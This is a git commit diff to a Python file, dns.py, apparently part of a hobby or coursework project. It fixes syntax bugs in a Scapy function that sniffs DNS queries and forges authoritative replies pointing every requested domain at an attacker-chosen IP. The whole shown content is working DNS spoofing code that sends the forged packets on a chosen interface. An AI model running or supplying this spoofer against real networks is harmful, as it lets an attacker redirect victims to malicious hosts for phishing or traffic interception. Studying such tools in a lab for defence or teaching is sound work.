674a99669720a760e37a2b153da5188e1b4fbf65
JarlJansen123 <64147158+JarlJansen123@users.noreply.github.com>
2021-06-04 00:23:18 +0200

    Add files via upload

--- dns.py
+++ dns.py
@@ -8,18 +8,20 @@ from scapy.all import *
 #method which does the DNS spoofing of a packet
 def dosomething(packet):
     print("I got one!! ")
-    if (packet.haslayer[DNS]) and (packet[DNS].qr == 0):
+    if (packet.haslayer(DNS)) and (packet[DNS].qr == 0):
         print("DNS packet found")
         #Case the user entered websites to redirect himself
         if(len(url) > 0):
             print("case we entered some shit ourselves")
+            print(packet[DNS].qd.qname)
         #Case all ULRs should be redirected
         else:
-            print("case when everything should be redirected)
+            print("case when everything should be redirected")
             spoofedETHER = Ether(src=packet[Ether].dst, dst=packet[Ether].src)
             spoofedIP = IP(src=packet[IP].dst, dst=packet[IP].src)
             spoofedUDP = UDP(sport=packet[UDP].dport, dport=packet[UDP].sport)
-            spoofedDNS = DNS(id=packet[DNS].id, qd=packet[DNS].qd, aa=1, qr=1, an=DNSRR(rrname=packet[DNS].qd.qname, rdata=ip_website) )
+            spoofedDNSRR = DNSRR(rrname=packet[DNS].qd.qname, rdata=ip_website)
+            spoofedDNS = DNS(id=packet[DNS].id, qd=packet[DNS].qd, aa=1, qr=1, an=spoofedDNSRR)
             #send the packet
             sendp(spoofedETHER/spoofedIP/spoofedUDP/spoofedDNS, iface=interface)
             print("we spoofed IP: {}, Query: {}, response: {}".format(packet[IP].src, packet[DNS].qd.qname, ip_website))
